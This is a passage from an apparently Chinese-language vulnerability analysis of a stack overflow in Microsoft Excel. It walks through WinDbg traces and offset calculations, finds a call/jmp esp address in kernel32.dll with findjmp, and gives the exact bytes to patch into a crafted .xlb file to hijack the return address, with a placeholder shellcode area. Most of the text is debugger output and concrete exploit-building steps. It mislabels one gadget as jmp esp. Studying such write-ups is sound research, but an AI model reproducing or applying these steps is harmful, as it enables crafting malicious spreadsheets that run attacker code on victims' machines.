
# 3. 利用分析

在调试器中执行到关键跳转位置时，寄存器和栈的状态如下：

```
0:000> t
eax=00000000 ebx=000000ff ecx=bcdcb8c1 edx=3160ff00 esi=00000000 edi=00000000
eip=30002150 esp=00139a18 ebp=00139ad8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
EXCEL!Ordinal41+0x2150:
30002150 3b0d009e8530    cmp     ecx,dword ptr [EXCEL!DllGetLCID+0x95d2 (30859e00)] ds:0023:30859e00=bcdcb8c1
```

如果检查不通过，程序就退出了。

所以栈中位置`0013aa04`的数值不能被修改。

这下可以回到`crashFun`函数了。结束了`call_vulFun`函数的调用，程序流程很快就跳转到了发生异常的位置：

```
300ce354 8b452c          mov     eax,dword ptr [ebp+2Ch] ss:0023:0013aab8=90909090
300ce357 3bc6            cmp     eax,esi // esi这里是0
300ce359 7408            je      EXCEL!Ordinal41+0xce363 (300ce363) // 无法跳转
300ce35b 8b0da01c8630    mov     ecx,dword ptr [EXCEL!DllGetLCID+0x11472 (30861ca0)]
300ce361 8908            mov     dword ptr [eax],ecx // 发生异常
```

注意到，程序从`0013aab8`的位置读取了四个字节的数据，并与0进行比较。如果比较成功，程序会进行一些数据的更新，并成功执行到`retn`语句。但是这里比较失败了，所以最终触发了异常。

我在调试的时候，手工把`eax`的值修改成了0，让跳转发生，并最终单步到达`retn`语句：

```
0:000> p
eax=00000000 ebx=00000002 ecx=bcdcb8c1 edx=3160ff00 esi=00000000 edi=0013c854
eip=300ce37d esp=0013aa90 ebp=90909090 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
EXCEL!Ordinal41+0xce37d:
300ce37d c22c00          ret 2Ch
```

注意此时`esp`寄存器的值为`0013aa90`。如果进行漏洞利用，我们希望这里保存的就是跳转地址了，比如`jmp esp`指令。

所以现在有两个特殊位置的数据需要注意：

1. `0013aab8`地址保存的应该是0，这样就能保证程序跳转到执行到`retn`语句
2. `0013aa90`地址保存的应该是`jmp esp`指令地址，之后可以放入shellcode的内容

在第2节的最后，我们已经确定，程序会把`src`偏移`0x20`开始的`0x300`个字节的数据复制到`0013aa3b`的位置。经过计算：

1. `0013aab8`位于`src`偏移`0x20 + 0x13aab8 - 0x13aa3b = 0x9D`的位置
2. `0013aa90`位于`src`偏移`0x20 + 0x13aa90 - 0x13aa3b = 0x75`的位置

## 3.2 构造exploit文件

根据上面得到的两个特殊位置，我尝试对`src.xlb`中这两个位置的数据进行修改。

### 3.2.1 确定返回地址

首先确定`jmp esp`指令地址：

之前在看Exploit编写系列教程的时候，里面提到了一个工具`findjmp.exe`：

```
C:\Documents and Settings\test\Desktop>findjmp kernel32.dll esp
Findjmp, Eeye, I2S-LaB
Findjmp2, Hat-Squad
Scanning kernel32.dll for code useable with the esp register
0x7C8369F0      call esp
0x7C86467B      jmp esp
0x7C868667      call esp
Finished Scanning kernel32.dll for code useable with the esp register
Found 3 usable addresses
```

### 3.2.2 修改src.xlb

`src.xlb`文件中，对应于我们之前在IDA中的`src`的位置，是在偏移`0x600`的位置，也就是BOF记录起始的位置。

从这里开始找到偏移`0x9D`的位置，修改四个字节为`00 00 00 00`；找到偏移`0x75`的位置，修改四个字节为`67 86 86 7c`。

由于程序最后执行的返回指令是`retn 2Ch`，所以在返回地址的后面要预留`0x2C`字节，再写入真正的shellcode。我没有仔细计算长度，只是预留了足够的位置，写入了`0xCC`。这里只做测试，所以先不放入真正的shellcode。

修改好对应位置之后，重新打开Excel，使用windbg附加，并在异常发生前的位置`0x300ce354`处设置断点，打开测试文件：

```
Breakpoint 0 hit
eax=00000000 ebx=00000002 ecx=a6a9c99e edx=3160ff00 esi=00000000 edi=00000400
eip=300ce354 esp=0013aa24 ebp=0013aa8c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
EXCEL!Ordinal41+0xce354:
300ce354 8b452c          mov     eax,dword ptr [ebp+2Ch] ss:0023:0013aab8=00000000
```

可以看到程序中断的位置，在`0013aab8`读取数值为`0`，数据修改成功。单步继续执行，到达`retn`语句：

```
0:000> p
eax=00000000 ebx=00000002 ecx=a6a9c99e edx=3160ff00 esi=00000000 edi=0013c854
eip=300ce37d esp=0013aa90 ebp=90909090 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
EXCEL!Ordinal41+0xce37d:
300ce37d c22c00          ret 2Ch
0:000> dd esp l1
0013aa90  7c868667
```

注意到此时栈顶的数据是`7c868667`，正是我们之前搜索到的`call esp`指令所在的位置，数据修改成功。继续单步执行，到达`call esp`：
